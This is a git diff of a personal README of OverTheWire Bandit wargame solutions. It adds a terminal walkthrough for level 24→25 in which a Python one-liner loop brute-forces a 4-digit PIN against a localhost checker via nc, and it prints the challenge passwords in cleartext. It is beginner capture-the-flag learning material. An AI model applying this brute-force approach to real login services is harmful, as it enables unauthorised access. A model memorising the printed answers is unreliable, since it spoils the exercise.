@@ -28,7 +28,7 @@ The Bandit wargame is aimed at absolute beginners.
 - [x] [Level 21 → Level 22](#level-21--level-22)
 - [x] [Level 22 → Level 23](#level-22--level-23)
 - [x] [Level 23 → Level 24](#level-23--level-24)
-- [ ] [Level 24 → Level 25](#level-24--level-25)
+- [x] [Level 24 → Level 25](#level-24--level-25)
 - [ ] [Level 25 → Level 26](#level-25--level-26)
 - [ ] [Level 26 → Level 27](#level-26--level-27)
 - [ ] [Level 27 → Level 28](#level-27--level-28)
@@ -601,7 +601,51 @@ bandit23@bandit:/tmp/bam$
 ---
 ### [Level 24 → Level 25](http://overthewire.org/wargames/bandit/bandit25.html)
 ```bash
+bandit24@bandit:~$ cd /tmp/
+bandit24@bandit:/tmp$ cd bam
+bandit24@bandit:/tmp/bam$ ls
+flag
+bandit24@bandit:/tmp/bam$ # Youpi ! The flag is still here
+bandit24@bandit:/tmp/bam$ python
+Python 2.7.12 (default, Dec  4 2017, 14:50:18) 
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 
+KeyboardInterrupt
+>>> 
+bandit24@bandit:/tmp/bam$ python --version
+Python 2.7.12
+bandit24@bandit:/tmp/bam$ # And python is installed
+bandit24@bandit:/tmp/bam$ nc localhost 30002 < flag 1234
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Fail! You did not supply enough data. Try again.
+Exiting.
+bandit24@bandit:/tmp/bam$ # Ok the flag and the 4-digit pincode must be separated by a space
+bandit24@bandit:/tmp/bam$ cat flag
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit24@bandit:/tmp/bam$ vi genlist.py
+bandit24@bandit:/tmp/bam$ cat genlist.py 
+for i in range(999, 10000):
+    print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " +str(i))
+bandit24@bandit:/tmp/bam$ python genlist.py > list
+bandit24@bandit:/tmp/bam$ nc localhost 30002 < list         
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct
+^C
+bandit24@bandit:/tmp/bam$ # Let's filter the results
+bandit24@bandit:/tmp/bam$ nc localhost 30002 < list | grep -v 'Wrong'
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 
+Exiting.
+bandit24@bandit:/tmp/bam$ 
 ```
 ---
 ### [Level 25 → Level 26](http://overthewire.org/wargames/bandit/bandit26.html)
